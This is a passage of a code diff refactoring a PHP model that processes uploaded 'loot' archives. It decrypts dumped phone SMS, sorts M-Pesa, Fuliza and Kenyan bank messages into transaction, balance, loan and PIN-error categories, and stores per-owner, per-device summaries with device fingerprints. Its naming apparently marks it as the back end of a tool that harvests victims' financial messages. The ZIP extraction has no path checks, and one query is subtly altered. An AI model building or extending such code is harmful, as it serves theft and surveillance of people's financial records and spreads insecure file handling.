@@ -2,471 +2,412 @@
 
 namespace App\Models;
 
-use CodeIgniter\API\ResponseTrait;
-
 use CodeIgniter\Model;
-
 use App\Models\ModCryption;
-use PHPUnit\Exception;
+use ZipArchive;
 
 class ModUploads extends Model
 {
-    use ResponseTrait;
     protected $table = "tbl_Loot";
+    protected $primaryKey = "loot_Id";
+    protected $allowedFields = [
+        'loot_Name', 'loot_Device', 'loot_Owner', 'loot_Uuid', 'loot_Created'
+    ];
 
-    public function file_upload($data){
-        return $this->db->table('tbl_Loot')->insert($data);
+    // SMS pattern configuration with 'sms_' prefix
+    protected $smsPatterns = [
+        'sms_receive' => "confirmed.you have received ksh",
+        'sms_from_mshwari' => "transferred from m-shwari account on",
+        'sms_from_ncba' => "from ncba bank on",
+        'sms_from_kcb' => "from kcb",
+        'sms_from_im_bank' => "from im bank limited- app on",
+        'sms_balance_mpesa' => "confirmed. your account balance was",
+        'sms_balance_kcb' => "confirmed. your kcb m-pesa",
+        'sms_balance_mshwari' => "confirmed . your m-shwari deposit account",
+        'sms_reversal' => "confirmed. reversal of transaction",
+        'sms_loan_limit' => "confirmed. your loan limit is",
+        'sms_sent_to_mpesa' => "sent to",
+        'sms_sent_to_lnm' => "paid to",
+        'sms_sent_mini' => "confirmed. you have transfered ksh",
+        'sms_sent_to_mshwari' => "transferred to m-shwari account on",
+        'sms_sent_cancel' => "you have cancelled the transaction",
+        'sms_error_failed' => "failed.",
+        'sms_error_pin' => "you have entered the wrong pin",
+        'sms_error_insufficient' => "insufficient funds in your",
+        'sms_error_receiver' => "the number you are trying to pay has not joined the service",
+        'sms_error_receiver_org' => "transaction failed, m-pesa cannot complete payment of",
+        'sms_withdraw' => "confirmed.on",
+        'sms_fuliza_opt_out' => "you have successfully opted out of fuliza m-pesa service.",
+        'sms_fuliza_opt_in' => "you have successfully opted into fuliza m-pesa.",
+        'sms_fuliza_limit' => "your fuliza m-pesa limit is ksh",
+        'sms_fuliza_loan_pay' => "from your m-pesa has been used to partially pay your outstanding fuliza m-pesa",
+        'sms_fuliza_mini_statement' => "your fuliza m-pesa mini statement is as follows",
+        'sms_fuliza_loan_taken' => "confirmed. fuliza m-pesa amount is",
+        'sms_similar_transaction' => "m-pesa is unable to process your request because a similar transaction is currently underway",
+        'sms_unknown' => "" // Default catch-all
+    ];
+
+    // ============ PUBLIC METHODS ============ //
+
+    public function file_upload(array $data): bool {
+        return $this->db->table($this->table)->insert($data);
     }
 
-    public function loot_zip_extract($loot_zip_file_name){
+    public function loot_zip_extract(string $zipFilePath): bool {
+        $this->validate_zip_file($zipFilePath);
+
+        $extractPath = WRITEPATH . 'uploads/txt_loot/';
+        $this->ensure_directory_exists($extractPath);
+
         $zip = new ZipArchive();
-        $filename = $loot_zip_file_name;
-
-        if ($zip->open($filename) === TRUE) {
-            $zip->extractTo(WRITEPATH . 'uploads/txt_loot/');
-            $zip->close();
-            echo 'Archive extracted!';
-        } else {
-            echo 'Failed to extract archive.';
+        if ($zip->open($zipFilePath) !== TRUE) {
+            throw new \RuntimeException("Failed to open ZIP file");
         }
+
+        $zip->extractTo($extractPath);
+        $zip->close();
+
+        return true;
     }
 
-    public function loot_last_uploaded(){
-        $result = $this->db->table('tbl_Loot')->selectMax('loot_Id')->get();
-        //return $result->getResult()[0]->loot_Id;
-        return $result->getResult()[0]->loot_Uuid;
+    public function loot_last_uploaded(): ?string {
+        $result = $this->db->table($this->table)
+            ->selectMax('loot_Uuid')
+            ->get();
+
+        return $result->getResult()[0]->loot_Uuid ?? null;
     }
 
-    public function loot_info($loot_uuid){
-        $builder = $this->db->table('tbl_Loot');
-        $result = $builder->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
+    public function loot_info(string $loot_uuid): array {
+        return $this->db->table($this->table)
+            ->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
             ->where('loot_Uuid', $loot_uuid)
-            ->get();
-        return $result->getResult();
+            ->get()
+            ->getResult();
     }
 
-    public function loot_info_all($loot_uuid){
-        $builder = $this->db->table('tbl_Loot');
-        $result = $builder->where('loot_Uuid', $loot_uuid)
-            ->get();
-        return $result->getResult();
+    public function loot_info_all(string $loot_uuid): array {
+        return $this->db->table($this->table)
+            ->where('loot_Uuid', $loot_uuid)
+            ->get()
+            ->getResult();
     }
 
-    public function loot_summary($loot_uuid){
-        $builder = $this->db->table('tbl_Loot_Summary');
-        $result = $builder->where('loot_Uuid', $loot_uuid)->get();
-        return $result->getResult();
+    public function loot_summary(string $loot_uuid): array {
+        return $this->db->table('tbl_Loot_Summary')
+            ->where('loot_Uuid', $loot_uuid)
+            ->get()
+            ->getResult();
     }
 
-    function clean_sms_by_trimming_messages($sms_messages){
-        $message_trimmed = array();
-        $sms_term_transaction = "transaction cost";
-
-        foreach ($sms_messages as $sms_single_array) {
-            if($sms_single_array->Number == "MPESA") {
-                $sms_obj_string = strtolower(base64_decode($sms_single_array->Body));
-                // Clean based on terminators
-                if (strpos($sms_obj_string, $sms_term_transaction) !== false) {
-                    $cleaned_message = base64_encode(substr($sms_obj_string, 0, strpos($sms_obj_string, $sms_term_transaction)));
-                } else {
-                    $cleaned_message = base64_encode($sms_obj_string);
-                }
-
-                array_push($message_trimmed, $cleaned_message);
-            }
-
-        }
-        return $message_trimmed;
-    }
-
-    function clean_sms_by_categorizing($sms_messages) {
-        $sms_categories = array();
-
-        $sms_get_receive = "confirmed.you have received ksh";
-        //$sms_get_bank" => "confirmed.you have received ksh";
-        $sms_get_from_mshwari = "transferred from m-shwari account on";
-        $sms_get_from_ncba = "from ncba bank on";
-        $sms_get_from_kcb = "from kcb";
-        $sms_get_from_im_bank = "from im bank limited- app on";
-        $sms_get_bal = "confirmed. your account balance was";
-        $sms_get_bal_kcb = "confirmed. your kcb m-pesa";
-        $sms_get_bal_mshwari = "confirmed . your m-shwari deposit account";
-        $sms_get_reversal = "confirmed. reversal of transaction";
-        $sms_loan_limit = "confirmed. your loan limit is";
-        $sms_sent_to_mpesa = "sent to";
-        $sms_sent_to_LNM = "paid to";
-        $sms_sent_mini = "confirmed. you have transfered ksh";
-        $sms_sent_to_mshwari = "transferred to m-shwari account on";
-        $sms_sent_cancel = "you have cancelled the transaction";
-        $sms_error_failed = "failed.";
-        $sms_error_pin = "you have entered the wrong pin";
-        $sms_error_less = "insufficient funds in your";
-        $sms_error_receiver = "the number you are trying to pay has not joined the service";
-        $sms_error_receiver_org = "transaction failed, m-pesa cannot complete payment of";
-        $sms_withdraw = "confirmed.on";
-        $sms_fuliza_leave = "you have successfully opted out of fuliza m-pesa service.";
-        $sms_fuliza_opt_in = "you have successfully opted into fuliza m-pesa.";
-        $sms_fuliza_limit = "your fuliza m-pesa limit is ksh";
-        $sms_fuliza_loan_pay = "from your m-pesa has been used to partially pay your outstanding fuliza m-pesa";
-        $sms_fuliza_mini_statement = "your fuliza m-pesa mini statement is as follows";
-        $sms_fuliza_loan_taken = "confirmed. fuliza m-pesa amount is";
-        $sms_similar_transaction = "m-pesa is unable to process your request because a similar transaction is currently underway";
-
-        $sms_count_get_receive          = 0;
-        $sms_count_get_from_mshwari     = 0;
-        $sms_count_get_from_ncba        = 0;
-        $sms_count_get_from_kcb         = 0;
-        $sms_count_get_from_im_bank     = 0;
-        $sms_count_get_bal_mpesa        = 0;
-        $sms_count_get_bal_kcb          = 0;
-        $sms_count_get_bal_mshwari      = 0;
-        $sms_count_get_reversal         = 0;
-        $sms_count_loan_limit           = 0;
-        $sms_count_sent_to_mpesa        = 0;
-        $sms_count_sent_to_LNM          = 0;
-        $sms_count_sent_mini            = 0;
-        $sms_count_sent_to_mshwari      = 0;
-        $sms_count_sent_cancel          = 0;
-        $sms_count_error_failed         = 0;
-        $sms_count_error_pin            = 0;
-        $sms_count_error_less           = 0;
-        $sms_count_error_receiver       = 0;
-        $sms_count_error_receiver_org   = 0;
-        $sms_count_withdraw             = 0;
-        $sms_count_fuliza_opt_out       = 0;
-        $sms_count_fuliza_opt_in        = 0;
-        $sms_count_fuliza_limit         = 0;
-        $sms_count_fuliza_loan_pay      = 0;
-        $sms_count_fuliza_mini_statement= 0;
-        $sms_count_fuliza_loan_taken    = 0;
-        $sms_count_similar_transaction  = 0;
-        $sms_count_unknown              = 0;
-
-        foreach ($sms_messages as $b64_sms_body) {
-            $sms_body = base64_decode($b64_sms_body);
-            $sms_re_get_receive = preg_match("/" . preg_quote($sms_get_receive, "/") . "/", $sms_body);
-            $sms_re_get_from_mshwari = preg_match("/" . preg_quote($sms_get_from_mshwari, "/") . "/", $sms_body);
-            $sms_re_get_from_ncba = preg_match("/" . preg_quote($sms_get_from_ncba, "/") . "/", $sms_body);
-            $sms_re_get_from_kcb = preg_match("/" . preg_quote($sms_get_from_kcb, "/") . "/", $sms_body);
-            $sms_re_get_from_im_bank = preg_match("/" . preg_quote($sms_get_from_im_bank, "/") . "/", $sms_body);
-            $sms_re_get_bal = preg_match("/" . preg_quote($sms_get_bal, "/") . "/", $sms_body);
-            $sms_re_get_bal_kcb = preg_match("/" . preg_quote($sms_get_bal_kcb, "/") . "/", $sms_body);
-            $sms_re_get_bal_mshwari = preg_match("/" . preg_quote($sms_get_bal_mshwari, "/") . "/", $sms_body);
-            $sms_re_get_reversal = preg_match("/" . preg_quote($sms_get_reversal, "/") . "/", $sms_body);
-            $sms_re_loan_limit = preg_match("/" . preg_quote($sms_loan_limit, "/") . "/", $sms_body);
-            $sms_re_sent_to_mpesa = preg_match("/" . preg_quote($sms_sent_to_mpesa, "/") . "/", $sms_body);
-            $sms_re_sent_to_LNM = preg_match("/" . preg_quote($sms_sent_to_LNM, "/") . "/", $sms_body);
-            $sms_re_sent_mini = preg_match("/" . preg_quote($sms_sent_mini, "/") . "/", $sms_body);
-            $sms_re_sent_to_mshwari = preg_match("/" . preg_quote($sms_sent_to_mshwari, "/") . "/", $sms_body);
-            $sms_re_sent_cancel = preg_match("/" . preg_quote($sms_sent_cancel, "/") . "/", $sms_body);
-            $sms_re_error_failed = preg_match("/" . preg_quote($sms_error_failed, "/") . "/", $sms_body);
-            $sms_re_error_pin = preg_match("/" . preg_quote($sms_error_pin, "/") . "/", $sms_body);
-            $sms_re_error_less = preg_match("/" . preg_quote($sms_error_less, "/") . "/", $sms_body);
-            $sms_re_error_receiver = preg_match("/" . preg_quote($sms_error_receiver, "/") . "/", $sms_body);
-            $sms_re_error_receiver_org = preg_match("/" . preg_quote($sms_error_receiver_org, "/") . "/", $sms_body);
-            $sms_re_withdraw = preg_match("/" . preg_quote($sms_withdraw, "/") . "/", $sms_body);
-            $sms_re_fuliza_leave = preg_match("/" . preg_quote($sms_fuliza_leave, "/") . "/", $sms_body);
-            $sms_re_fuliza_opt_in = preg_match("/" . preg_quote($sms_fuliza_opt_in, "/") . "/", $sms_body);
-            $sms_re_fuliza_limit = preg_match("/" . preg_quote($sms_fuliza_limit, "/") . "/", $sms_body);
-            $sms_re_fuliza_loan_pay = preg_match("/" . preg_quote($sms_fuliza_loan_pay, "/") . "/", $sms_body);
-            $sms_re_fuliza_mini_statement = preg_match("/" . preg_quote($sms_fuliza_mini_statement, "/") . "/", $sms_body);
-            $sms_re_fuliza_loan_taken = preg_match("/" . preg_quote($sms_fuliza_loan_taken, "/") . "/", $sms_body);
-            $sms_re_similar_transaction = preg_match("/" . preg_quote($sms_similar_transaction, "/") . "/", $sms_body);
-
-            switch (true) {
-                case $sms_re_get_receive:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_receive_from_mpesa")));
-                    $sms_count_get_receive++;
-                    break;
-                case $sms_re_get_from_mshwari:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_mshwari")));
-                    $sms_count_get_from_mshwari++;
-                    break;
-                case $sms_re_get_from_ncba:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_ncba")));
-                    $sms_count_get_from_ncba++;
-                    break;
-                case $sms_re_get_from_kcb:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_kcb")));
-                    $sms_count_get_from_kcb++;
-                    break;
-                case $sms_re_get_from_im_bank:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_im_bank")));
-                    $sms_count_get_from_im_bank++;
-                    break;
-                case $sms_re_get_bal:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_bal_mpesa")));
-                    $sms_count_get_bal_mpesa++;
-                    break;
-                case $sms_re_get_bal_kcb:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_bal_kcb")));
-                    $sms_count_get_bal_kcb++;
-                    break;
-                case $sms_re_get_bal_mshwari:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_bal_mshwari")));
-                    $sms_count_get_bal_mshwari++;
-                    break;
-                case $sms_re_get_reversal:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_get_from_reversal")));
-                    $sms_count_get_reversal++;
-                    break;
-                case $sms_re_loan_limit:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_loan_limit")));
-                    $sms_count_loan_limit++;
-                    break;
-                case$sms_re_sent_to_mpesa:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_to_mpesa")));
-                    $sms_count_sent_to_mpesa++;
-                    break;
-                case $sms_re_sent_to_LNM:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_to_LNM")));
-                    $sms_count_sent_to_LNM++;
-                    break;
-                case $sms_re_sent_mini:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_mini_statement")));
-                    $sms_count_sent_mini++;
-                    break;
-                case $sms_re_sent_to_mshwari:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_to_mshwari")));
-                    $sms_count_sent_to_mshwari++;
-                    break;
-                case $sms_re_sent_cancel:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_sent_cancel")));
-                    $sms_count_sent_cancel++;
-                    break;
-                case $sms_re_error_failed:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_failed")));
-                    $sms_count_error_failed++;
-                    break;
-                case $sms_re_error_pin:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_pin")));
-                    $sms_count_error_pin++;
-                    break;
-                case $sms_re_error_less:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_less")));
-                    $sms_count_error_less++;
-                    break;
-                case $sms_re_error_receiver:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_receiver")));
-                    $sms_count_error_receiver++;
-                    break;
-                case $sms_re_error_receiver_org:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_error_receiver_org")));
-                    $sms_count_error_receiver_org++;
-                    break;
-                case $sms_re_withdraw:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_withdraw")));
-                    $sms_count_withdraw++;
-                    break;
-                case $sms_re_fuliza_leave:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_opt_out")));
-                    $sms_count_fuliza_opt_out++;
-                    break;
-                case $sms_re_fuliza_opt_in:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_opt_in")));
-                    $sms_count_fuliza_opt_in++;
-                    break;
-                case $sms_re_fuliza_limit:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_limit")));
-                    $sms_count_fuliza_limit++;
-                    break;
-                case $sms_re_fuliza_loan_pay:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_loan_pay")));
-                    $sms_count_fuliza_loan_pay++;
-                    break;
-                case $sms_re_fuliza_mini_statement:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_mini_statement")));
-                    $sms_count_fuliza_mini_statement++;
-                    break;
-                case $sms_re_fuliza_loan_taken:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_fuliza_loan_taken")));
-                    $sms_count_fuliza_loan_taken++;
-                    break;
-                case $sms_re_similar_transaction:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_similar_transaction")));
-                    $sms_count_similar_transaction++;
-                    break;
-                default:
-                    array_push($sms_categories, ucwords(str_replace("_", ' ', "sms_unknown")));
-                    $sms_count_unknown++;
-                    break;
-            }
-        }
-
-        $sms_categories_counter = array("sms_get_receive_from_mpesa" => $sms_count_get_receive,
-            "sms_get_from_mshwari" => $sms_count_get_from_mshwari,
-            "sms_get_from_ncba" => $sms_count_get_from_ncba,
-            "sms_get_from_kcb" => $sms_count_get_from_kcb,
-            "sms_get_from_im_bank" => $sms_count_get_from_im_bank,
-            "sms_get_bal_mpesa" => $sms_count_get_bal_mpesa,
-            "sms_get_bal_kcb" => $sms_count_get_bal_kcb,
-            "sms_get_bal_mshwari" => $sms_count_get_bal_mshwari,
-            "sms_get_from_reversal" => $sms_count_get_reversal,
-            "sms_loan_limit" => $sms_count_loan_limit,
-            "sms_sent_to_mpesa" => $sms_count_sent_to_mpesa,
-            "sms_sent_to_LNM" => $sms_count_sent_to_LNM,
-            "sms_sent_mini_statement" => $sms_count_sent_mini,
-            "sms_sent_to_mshwari" => $sms_count_sent_to_mshwari,
-            "sms_sent_cancel" => $sms_count_sent_cancel,
-            "sms_error_failed" => $sms_count_error_failed,
-            "sms_error_pin" => $sms_count_error_pin,
-            "sms_error_less" => $sms_count_error_less,
-            "sms_error_receiver" => $sms_count_error_receiver,
-            "sms_error_receiver_org" => $sms_count_error_receiver_org,
-            "sms_withdraw" => $sms_count_withdraw,
-            "sms_fuliza_opt_out" => $sms_count_fuliza_opt_out,
-            "sms_fuliza_opt_in" => $sms_count_fuliza_opt_in,
-            "sms_fuliza_limit" => $sms_count_fuliza_limit,
-            "sms_fuliza_loan_pay" => $sms_count_fuliza_loan_pay,
-            "sms_fuliza_mini_statement" => $sms_count_fuliza_mini_statement,
-            "sms_fuliza_loan_taken" => $sms_count_fuliza_loan_taken,
-            "sms_similar_transaction" => $sms_count_similar_transaction,
-            "sms_unknown" => $sms_count_unknown);
-
-        return array($sms_categories, $sms_categories_counter);
-    }
-
-    function clean_sms_by_returning_column($sms_messages, $column_name) {
-        $sms_column = array();
-
-        $thread_id = 'Thread Id';
-        foreach ($sms_messages as $sms_single_array) {
-            if($sms_single_array->Number == "MPESA") {
-                if ($column_name == "Thread Id"){
-                    array_push($sms_column, $sms_single_array->$thread_id);
-                }else {
-                    array_push($sms_column, $sms_single_array->$column_name);
-                }
-            }
-        }
-        return $sms_column;
-    }
-
-    public function loot_parse_sms($loot_uuid, $loot_owner, $loot_device, $dated){
-        $mod_cryption = new ModCryption();
-        $query_name = $this->db->table('tbl_Loot')->select('loot_Name')
-            //->where('loot_Id', $loot_id)->get()->getResult();
-            ->where('loot_Uuid', $loot_uuid)->get()->getResult();
-        $loot_name = $query_name[0]->loot_Name;
-        $loot_file = WRITEPATH."uploads/txt_loot/".$loot_name;
-
-        $loot_data = file_get_contents($loot_file);
-        $loot_decoded = $mod_cryption->decode_content($loot_data);
-
-        $data_dump1 = str_replace("-------(//)--------", "", $loot_decoded);
-        $data_dump2 = str_replace("\n", '****', $data_dump1);
-        $data_dump3 = str_replace('****"', '"', $data_dump2);
-        $data_dump4 = "[".substr($data_dump3, 0, -2)."}]";
-
-        $data = json_encode($data_dump4);
-        $data1 = json_decode($data);
-        $data2 = json_decode($data1);
-
-        $data2_sms_terminated = $this->clean_sms_by_trimming_messages($data2);
-        list($data2_sms_category, $data2_sms_category_counter_arr) =  $this->clean_sms_by_categorizing($data2_sms_terminated);
-        $data2_sms_category_date_uncleaned = $this->clean_sms_by_returning_column($data2, "Date");
-        $data2_sms_category_type_uncleaned = $this->clean_sms_by_returning_column($data2, "Type");
-        $data2_sms_category_number_uncleaned = $this->clean_sms_by_returning_column($data2, "Number");
-        $data2_sms_category_seen_uncleaned = $this->clean_sms_by_returning_column($data2, "Seen");
-        $data2_sms_category__id_uncleaned = $this->clean_sms_by_returning_column($data2, "ID");
-        $data2_sms_category_thread_id_uncleaned = $this->clean_sms_by_returning_column($data2, "Thread Id");
+    public function loot_parse_sms(
+        string $loot_uuid,
+        string $loot_owner,
+        string $loot_device,
+        string $dated
+    ): array {
+        $result = ['status' => 'error', 'message' => ''];
 
         try {
-            for($counter = 1; $counter <= count($data2_sms_terminated); $counter++ ){
-                $data = array(
-                    'sms_type'          => $data2_sms_category_type_uncleaned[$counter],
-                    'sms_number'        => $data2_sms_category_number_uncleaned[$counter],
-                    'sms_thread_id'     => $data2_sms_category_thread_id_uncleaned[$counter],
-                    'sms_time'          => $data2_sms_category_date_uncleaned[$counter],
-                    'sms_category'      => $data2_sms_category[$counter],
-                    'sms_seen'          => $data2_sms_category_seen_uncleaned[$counter],
-                    'sms__id'           => $data2_sms_category__id_uncleaned[$counter],
-                    'sms_body'          => $data2_sms_terminated[$counter],
-                    //'sms_body_cleaned'  => $data2_sms_terminated,
-                    'sms_loot_source'   => $loot_uuid,
-                    'sms_owner'         => $loot_owner,
-                    'sms_device'        => $loot_device,
-                );
-                $this->db->table('tbl_Sms')->insert($data);
-            }
-            //$this->db->table('tbl_Sms')->insertBatch($sms_data);
-        }catch (\Exception $ex){}
+            $this->db->transBegin();
 
-        $data1 = array('loot_Uuid' => $loot_uuid,
-            'info_Get_from_MPESA' => $data2_sms_category_counter_arr['sms_get_receive_from_mpesa'],
-            'info_Get_from_Mshwari' => $data2_sms_category_counter_arr['sms_get_from_mshwari'],
-            'info_Get_from_NCBA' => $data2_sms_category_counter_arr['sms_get_from_ncba'],
-            'info_Get_from_KCB' => $data2_sms_category_counter_arr['sms_get_from_kcb'],
-            'info_Get_from_IM' => $data2_sms_category_counter_arr['sms_get_from_im_bank'],
-            'info_Get_from_Reversal' => $data2_sms_category_counter_arr['sms_get_from_reversal'],
-            'info_Get_Bal_MPESA' => $data2_sms_category_counter_arr['sms_get_bal_mpesa'],
-            'info_Get_Bal_KCB' => $data2_sms_category_counter_arr['sms_get_bal_kcb'],
-            'info_Get_Bal_Mshwari' => $data2_sms_category_counter_arr['sms_get_bal_mshwari'],
-            'info_Loan_Limit' => $data2_sms_category_counter_arr['sms_loan_limit'],
-            'info_Sent_to_MPESA' => $data2_sms_category_counter_arr['sms_sent_to_mpesa'],
-            'info_Sent_Mini' => $data2_sms_category_counter_arr['sms_sent_mini_statement'],
-            'info_Sent_to_Mshwari' => $data2_sms_category_counter_arr['sms_sent_to_mshwari'],
-            'info_Sent_to_LNM' => $data2_sms_category_counter_arr['sms_sent_to_LNM'],
-            'info_Sent_Cancel' => $data2_sms_category_counter_arr['sms_sent_cancel'],
-            'info_Error_Failed' => $data2_sms_category_counter_arr['sms_error_failed'],
-            'info_Error_Pin' => $data2_sms_category_counter_arr['sms_error_pin'],
-            'info_Error_Less' => $data2_sms_category_counter_arr['sms_error_less'],
-            'info_Error_Receiver' => $data2_sms_category_counter_arr['sms_error_receiver'],
-            'info_Error_Receiver_Org' => $data2_sms_category_counter_arr['sms_error_receiver_org'],
-            'info_Withdraw' => $data2_sms_category_counter_arr['sms_withdraw'],
-            'info_Fuliza_Opt_Out' => $data2_sms_category_counter_arr['sms_fuliza_opt_out'],
-            'info_Fuliza_Opt_In' => $data2_sms_category_counter_arr['sms_fuliza_opt_in'],
-            'info_Fuliza_Limit' => $data2_sms_category_counter_arr['sms_fuliza_limit'],
-            'info_Fuliza_Loan_Paid' => $data2_sms_category_counter_arr['sms_fuliza_loan_pay'],
-            'info_Fuliza_Mini_Statement' => $data2_sms_category_counter_arr['sms_fuliza_mini_statement'],
-            'info_Fuliza_Loan_Taken' => $data2_sms_category_counter_arr['sms_fuliza_loan_taken'],
-            'info_Similar_Transaction' => $data2_sms_category_counter_arr['sms_similar_transaction'],
-            'info_Unknown' => $data2_sms_category_counter_arr['sms_unknown'],
-            'info_All' => count($data2_sms_category),
-            'loot_Created' => $dated
-        );
-        $this->db ->table('tbl_Loot_Summary')->insert($data1);
+            // 1. Validate and get loot file
+            $lootFile = $this->validate_and_get_loot_file($loot_uuid);
+
+            // 2. Load and decrypt content
+            $decrypted = $this->decrypt_loot_file($lootFile['path']);
+
+            // 3. Parse JSON data
+            $smsData = $this->parse_sms_json($decrypted);
+
+            // 4. Process messages
+            $processed = $this->process_sms_messages(
+                $smsData,
+                $loot_uuid,
+                $loot_owner,
+                $loot_device
+            );
+
+            // 5. Save summary
+            $this->save_summary_data(
+                $processed['counters'],
+                $loot_uuid,
+                $dated
+            );
+
+            $this->db->transCommit();
+
+            return [
+                'status' => 'success',
+                'processed' => $processed['inserted_count'],
+                'summary' => $processed['counters']
+            ];
+
+        } catch (\Exception $e) {
+            $this->db->transRollback();
+            log_message('error', 'SMS Processing Error: ' . $e->getMessage());
+            $result['message'] = $e->getMessage();
+            return $result;
+        }
     }
 
-    public function file_listing($loot_owner, $loot_device){
-        $builder = $this->db->table('tbl_Loot');
-        $get_all = $builder
+    public function file_listing(string $loot_owner, string $loot_device): array {
+        return $this->db->table($this->table)
             ->where('loot_Device', $loot_device)
             ->where('loot_Owner', $loot_owner)
             ->orderBy('loot_Id', 'DESC')
-            ->get();
-        return $get_all->getResult();
+            ->get()
+            ->getResult();
     }
 
-    public function file_delete($userid){
-        $table = 'tbl_users';
-    }
-
-    public function device_check_print($print_dump){
-        $builder = $this->db->table('tbl_Devices');
-        $get_all = $builder->select('device_Uuid')
+    public function device_check_print(array $print_dump): array {
+        return $this->db->table('tbl_Devices')
+            ->select('device_Uuid')
             ->where($print_dump)
-            ->get();
-        return $get_all->getResult();
+            ->get()
+            ->getResult();
     }
 
-    public function get_loot_uuid($loot_name){
-        $builder = $this->db->table('tbl_Loot');
-        $get_all = $builder->select('loot_Uuid')
+    public function get_loot_uuid(string $loot_name): string {
+        $result = $this->db->table($this->table)
+            ->select('loot_Uuid')
             ->where('loot_Name', $loot_name)
-            ->get();
-        return $get_all->getResult()[0]->loot_Uuid;
+            ->get()
+            ->getResult();
+
+        return $result[0]->loot_Uuid ?? '';
     }
 
-    public function get_loot_summary_from_uuids($loot_aray_uuids){
-        $builder = $this->db->table('tbl_Loot_Summary');
-        $get_all = $builder->select('*')
-            ->whereIn('loot_Uuid', $loot_aray_uuids)
-            ->get();
-        return $get_all->getResult();
+    public function get_loot_summary_from_uuids(array $loot_array_uuids): array {
+        return $this->db->table('tbl_Loot_Summary')
+            ->select('*')
+            ->whereIn('loot_Uuid', $loot_array_uuids)
+            ->get()
+            ->getResult();
     }
 
-    public function device_make_print($print_dump){
+    public function device_make_print(array $print_dump): bool {
         return $this->db->table('tbl_Devices')->insert($print_dump);
+    }
+
+    // ============ PROTECTED METHODS ============ //
+
+    protected function clean_sms_by_trimming_messages(array $smsMessages): array {
+        $cleanedMessages = [];
+        $transactionTerm = "transaction cost";
+
+        foreach ($smsMessages as $sms) {
+            if ($sms->Number != "MPESA") {
+                continue;
+            }
+
+            $message = strtolower(base64_decode($sms->Body));
+            $position = strpos($message, $transactionTerm);
+
+            $cleanedMessages[] = base64_encode(
+                $position !== false
+                    ? substr($message, 0, $position)
+                    : $message
+            );
+        }
+
+        return $cleanedMessages;
+    }
+
+    protected function clean_sms_by_categorizing(array $smsMessages): array {
+        $categories = [];
+        $counters = array_fill_keys(array_keys($this->smsPatterns), 0);
+
+        foreach ($smsMessages as $message) {
+            $decoded = base64_decode($message);
+            $category = 'sms_unknown';
+
+            foreach ($this->smsPatterns as $name => $pattern) {
+                if (!empty($pattern) && strpos($decoded, $pattern) !== false) {
+                    $category = $name;
+                    break;
+                }
+            }
+
+            $counters[$category]++;
+            $categories[] = ucwords(str_replace(['sms_', '_'], ['', ' '], $category));
+        }
+
+        return [
+            'categories' => $categories,
+            'counters' => $counters
+        ];
+    }
+
+    protected function clean_sms_by_returning_column(array $smsMessages, string $columnName): array {
+        $columnData = [];
+        $property = $columnName === 'Thread Id' ? 'Thread Id' : $columnName;
+
+        foreach ($smsMessages as $sms) {
+            if ($sms->Number === "MPESA") {
+                $columnData[] = $sms->$property;
+            }
+        }
+
+        return $columnData;
+    }
+
+    protected function validate_zip_file(string $path): void {
+        if (!file_exists($path)) {
+            throw new \RuntimeException("ZIP file not found");
+        }
+
+        if (mime_content_type($path) !== 'application/zip') {
+            throw new \RuntimeException("Invalid file type");
+        }
+    }
+
+    protected function ensure_directory_exists(string $path): void {
+        if (!is_dir($path)) {
+            mkdir($path, 0755, true);
+        }
+    }
+
+    protected function validate_and_get_loot_file(string $uuid): array {
+        $query = $this->db->table($this->table)
+            ->select('loot_Name')
+            ->where('loot_Uuid', $uuid)
+            ->get();
+
+        if ($query->getNumRows() === 0) {
+            throw new \RuntimeException("Loot record not found");
+        }
+
+        $fileName = $query->getRow()->loot_Name;
+        $filePath = WRITEPATH . "uploads/txt_loot/" . $fileName;
+
+        if (!file_exists($filePath)) {
+            throw new \RuntimeException("Loot file not found");
+        }
+
+        return [
+            'name' => $fileName,
+            'path' => $filePath
+        ];
+    }
+
+    protected function decrypt_loot_file(string $path): string {
+        $modCryption = new ModCryption();
+        $content = file_get_contents($path);
+        $decrypted = $modCryption->decode_content($content);
+
+        if (empty($decrypted)) {
+            throw new \RuntimeException("Failed to decrypt file");
+        }
+
+        return $decrypted;
+    }
+
+    protected function parse_sms_json(string $data): array {
+        $transformations = [
+            '-------(//)--------' => '',
+            "\n" => '****',
+            '****"' => '"'
+        ];
+
+        $normalized = str_replace(
+            array_keys($transformations),
+            array_values($transformations),
+            $data
+        );
+
+        $json = json_decode('[' . substr($normalized, 0, -2) . '}]');
+
+        if (json_last_error() !== JSON_ERROR_NONE) {
+            throw new \RuntimeException("JSON parse error: " . json_last_error_msg());
+        }
+
+        return $json;
+    }
+
+    protected function process_sms_messages(
+        array $smsData,
